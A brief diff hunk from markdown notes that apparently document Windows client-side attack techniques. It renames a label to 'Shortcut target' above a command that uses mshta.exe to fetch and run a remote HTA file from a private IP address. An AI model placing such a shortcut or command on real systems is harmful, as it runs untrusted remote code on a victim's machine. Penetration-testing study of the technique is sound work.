@@ -1813,7 +1813,7 @@ self.close();
 </html>
 ```
 
-Shortcut 
+Shortcut target
 ```
 C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta
 ```
